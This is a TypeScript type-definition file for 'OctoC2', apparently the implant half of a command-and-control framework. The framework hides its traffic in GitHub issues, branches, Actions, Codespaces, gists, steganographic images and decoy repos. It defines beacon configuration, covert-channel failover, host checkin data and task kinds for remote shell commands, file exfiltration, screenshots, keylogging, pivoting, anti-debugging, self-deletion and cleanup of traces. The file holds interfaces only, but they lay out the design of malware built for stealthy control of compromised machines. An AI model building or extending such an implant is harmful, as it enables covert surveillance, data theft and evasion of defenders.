/**
 * OctoC2 Implant — Core Type Definitions
 *
 * Every tentacle (communication channel) and the ConnectionFactory
 * operate against these shared interfaces. Phase 2 fills in the
 * concrete implementations.
 */

// ── Beacon identity ────────────────────────────────────────────────────────────

export interface BeaconConfig {
  /** Unique beacon ID (generated once at first run, persisted) */
  id: string;
  /** GitHub org/repo where the C2 "head" lives */
  repo: { owner: string; name: string };
  /** GitHub PAT or OIDC token — swapped out per OPSEC requirements */
  token: string;
  /** Tentacle priority order — tried left-to-right, failover on error */
  tentaclePriority: TentacleKind[];
  /** Sleep interval between checkins (seconds) + jitter (0–1 fraction) */
  sleepSeconds: number;
  jitter: number;
  /** libsodium public key of the operator (for encrypting task results) */
  operatorPublicKey: Uint8Array;
  /** This beacon's libsodium key pair (generated at first run) */
  beaconKeyPair: { publicKey: Uint8Array; secretKey: Uint8Array };
  /** Relay consortium entries (baked via OCTOC2_RELAY_CONSORTIUM at build time) */
  relayConsortium?: RelayConfig[];
  /** OctoProxy decoy repos (baked via OCTOC2_PROXY_REPOS at build time) */
  proxyRepos?: ProxyConfig[];
  /** Delete result comments older than this many days (0 = immediate). Omit to disable. */
  cleanupDays?: number;
  // ── GitHub App auth (optional — falls back to `token` PAT when absent) ──────
  /** Numeric GitHub App ID (from the app's settings page) */
  appId?: number;
  /** Installation ID for the C2 repository */
  installationId?: number;
  /**
   * App private key as a PEM string.
   * Delivered at runtime via dead-drop — never embedded in the binary.
   */
  appPrivateKey?: string;
}

// ── Tentacle channel types ─────────────────────────────────────────────────────

export type TentacleKind =
  | "issues"        // Tentacle 1  — GitHub Issues (primary, encrypted)
  | "branch"        // Tentacle 2  — Repository branches + files
  | "actions"       // Tentacle 3  — GitHub Actions (repository_dispatch)
  | "codespaces"    // Tentacle 4  — gRPC over Codespaces SSH tunnel
  | "pages"         // Tentacle 5  — GitHub Pages + Webhooks
  | "gist"          // Tentacle 6  — Gists + Artifacts
  | "oidc"          // Tentacle 7  — OIDC JWT channel (Actions id-token)
  | "secrets"       // Tentacle 7b — Secrets + Variables (OIDC/JWT, legacy label)
  | "pull_request"  // Tentacle 8  — Pull Requests + SSH + gRPC
  | "stego"         // Tentacle 9  — Steganographic (LSB images/fonts)
  | "proxy"         // Tentacle 10 — OctoProxy decoy repos
  | "notes"         // Tentacle 11 — Git notes covert channel (Phase 6)
  | "relay"         // Tentacle 12 — Relay consortium (Phase 6)
  | "http";        // Tentacle 13 — HTTP/WebSocket direct channel

// ── Task / Result message envelope ────────────────────────────────────────────

export type TaskKind =
  | "shell"          // Execute a command via /bin/sh -c (or cmd.exe /c)
  | "exec"           // Execute a command directly (no shell wrapper) via argv
  | "ping"           // Connectivity probe — returns timestamp + beacon metadata
  | "upload"         // Upload a file to the operator
  | "download"       // Download a file from the operator
  | "screenshot"     // Capture screenshot (where applicable)
  | "keylog_start"   // Start keylogger
  | "keylog_stop"    // Stop keylogger + flush
  | "load-module"   // Load + execute a dynamic module
  | "sleep"          // Update sleep interval + jitter
  | "kill"           // Self-terminate and optionally wipe
  | "pivot"          // Establish SOCKS/forward through beacon
  | "port_forward"   // TCP port forward via SSH tunnel
  | "evasion";       // OpenHulud evasion primitives (hide/anti-debug/sleep/self-delete)

export interface Task {
  /** Matches the server's QueuedTask.taskId */
  taskId: string;
  kind: TaskKind;
  /** Arbitrary task arguments (kind-specific) */
  args: Record<string, unknown>;
  /** Short ref token used in the deploy comment heartbeat line */
  ref?: string | undefined;
  /** ISO-8601 timestamp when this task was issued (optional — server may omit) */
  issuedAt?: string | undefined;
  /**
   * If set, this task should only be delivered by the named tentacle channel.
   * Channels skip tasks where this field is set to a different kind.
   */
  preferredChannel?: string | undefined;
}

export interface TaskResult {
  taskId: string;
  beaconId: string;
  success: boolean;
  output: string;
  /** Optional binary payload (e.g. file upload) — base64url */
  data?: string;
  completedAt: string;
  /** Signed with beacon's secret key so operator can verify authenticity */
  signature?: string;
  /** Optional execution metadata (e.g. shellInvoked, exitCode) */
  metadata?: Record<string, unknown>;
}

// ── Checkin / heartbeat ────────────────────────────────────────────────────────

export interface CheckinPayload {
  beaconId: string;
  /** The beacon's public key (base64url) — used for task encryption */
  publicKey: string;
  hostname: string;
  username: string;
  os: string;
  arch: string;
  pid: number;
  checkinAt: string;
}

// ── Tentacle interface ─────────────────────────────────────────────────────────

export interface ITentacle {
  readonly kind: TentacleKind;
  /** Is this channel currently usable? (auth valid, rate limit ok, etc.) */
  isAvailable(): Promise<boolean>;
  /** Send checkin; return list of pending tasks */
  checkin(payload: CheckinPayload): Promise<Task[]>;
  /** Submit a completed task result */
  submitResult(result: TaskResult): Promise<void>;
  /** Graceful teardown (close connections, cancel subscriptions) */
  teardown(): Promise<void>;
}

// ── ConnectionFactory options ──────────────────────────────────────────────────

export interface ConnectionFactoryOptions {
  config: BeaconConfig;
  /** Max consecutive failures before a tentacle is marked degraded */
  maxFailures?: number;
  /** How long (ms) a degraded tentacle waits before retrying */
  degradedCooldownMs?: number;
}

// ── Relay consortium ─────────────────────────────────────────────────────────

export interface RelayConfig {
  /** GitHub account that owns the relay Codespace */
  account: string;
  /** Repository to look up the Codespace SSH endpoint in */
  repo:    string;
  /** Optional token for this relay account (falls back to config.token) */
  token?:  string;
}

// ── OctoProxy decoy repo config ───────────────────────────────────────────────

/**
 * GitHub App credentials for a proxy repo.
 * When present, OctoProxyTentacle uses short-lived installation tokens
 * instead of a static PAT for its teardown Octokit instance.
 *
 * NOTE: Structurally mirrored by ProxyAppConfig in octoctl/src/commands/proxy.ts —
 * keep both in sync when adding fields.
 */
export interface AppConfig {
  /** Numeric GitHub App ID (as a string — converted internally) */
  appId:          string;
  /** Installation ID for the proxy repository (as a string) */
  installationId: string;
  /** App private key — PEM string (base64url-encoded or raw) */
  privateKey:     string;
}

export interface ProxyConfig {
  owner:     string;               // decoy GitHub org or user
  repo:      string;               // decoy repo name
  token?:    string;               // optional restricted PAT for proxy repo only
  innerKind: 'issues' | 'notes';  // which tentacle protocol to wrap
  appConfig?: AppConfig;           // optional GitHub App auth for this proxy repo
}
